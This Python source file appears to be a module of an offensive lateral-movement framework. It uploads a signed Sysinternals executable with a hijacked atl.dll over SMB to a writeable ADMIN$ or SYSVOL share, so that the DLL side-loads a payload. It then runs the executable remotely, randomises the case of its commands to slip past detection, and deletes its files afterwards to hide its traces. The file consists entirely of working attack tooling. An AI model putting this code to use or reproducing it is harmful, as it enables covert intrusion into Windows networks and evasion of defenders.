# -*- coding: UTF-8 -*-

import logging
import os

from framework import utils
from framework.connector import delete_file
from framework.connector import init_smb_connection
from framework.connector import log_smb_info
from framework.connector import upload_file
from framework.helpers import ServiceHelper
from framework.pokeball import BasePokeBall


class PokeBall(BasePokeBall):
    desc = "Service + adexplorer + unsigned.dll (XP only)"
    adexplorer = None
    atl = None
    atl_org = None

    tree = None
    exe_name = None
    exe_path = None

    uploaded_adexplorer = False
    uploaded_atl = False
    uploaded_atl_org = False
    run_adexplorer = False

    def init(self):
        self.payload_path = os.path.join(self.opts["data"], "payload", "pikachu.bin")
        if not os.path.exists(self.payload_path):
            raise Exception("{} does not existed".format(self.payload_path))

        self.adexplorer = os.path.join(self.opts["data"], "loader", "adexplorer.x86.exe")
        if not os.path.exists(self.adexplorer):
            raise Exception("{} does not existed".format(self.adexplorer))
        self.atl = os.path.join(self.opts["data"], "loader", "atl.x86.dll")
        if not os.path.exists(self.atl):
            raise Exception("{} does not existed".format(self.atl))
        self.atl_org = os.path.join(self.opts["data"], "loader", "atl_.x86.dll")
        if not os.path.exists(self.atl_org):
            raise Exception("{} does not existed".format(self.atl_org))

        self.smb_conn = init_smb_connection(self.opts)
        log_smb_info(self.smb_conn)

        self.helper = ServiceHelper(self.opts, self.smb_conn)
        self.helper.init()

    def delivery_loader(self):
        self.tree = utils.get_writeable_share(self.opts, self.smb_conn, ("SYSVOL", "ADMIN$"))
        if self.tree is None:
            raise Exception("Cannot find any writeable share folder")

        tree_path = utils.resolve_path(self.smb_conn, self.tree)
        self.exe_name = "{}.exe".format(self.pipe_name)
        self.exe_path = "{0}\\{1}".format(tree_path, self.exe_name)

        upload_file(self.atl, self.smb_conn, self.tree, "atl.dll")
        self.uploaded_atl = True
        upload_file(self.atl_org, self.smb_conn, self.tree, "atl_.dll")
        self.uploaded_atl_org = True
        upload_file(self.adexplorer, self.smb_conn, self.tree, self.exe_name)
        self.uploaded_adexplorer = True

        command = '{0} "{1}" -accepteula'.format(utils.random_case("start \"\" /b"), self.exe_path)
        logging.info("Execute: {}".format(command))
        self.helper.execute_command(command)
        self.run_adexplorer = True
        utils.sleep(3)

    def clean_up(self):
        if self.run_adexplorer:
            try:
                command = "taskkill /f /im {0}".format(self.exe_name)
                command = utils.random_case(command)
                self.helper.execute_command(command)
            except Exception as e:
                logging.error(e)

        if self.uploaded_atl:
            try:
                delete_file(self.smb_conn, self.tree, "atl.dll")
            except Exception as e:
                logging.error(e)
        if self.uploaded_atl_org:
            try:
                delete_file(self.smb_conn, self.tree, "atl_.dll")
            except Exception as e:
                logging.error(e)
        if self.uploaded_adexplorer:
            try:
                delete_file(self.smb_conn, self.tree, self.exe_name)
            except Exception as e:
                logging.error(e)

        self.helper.clean_up()
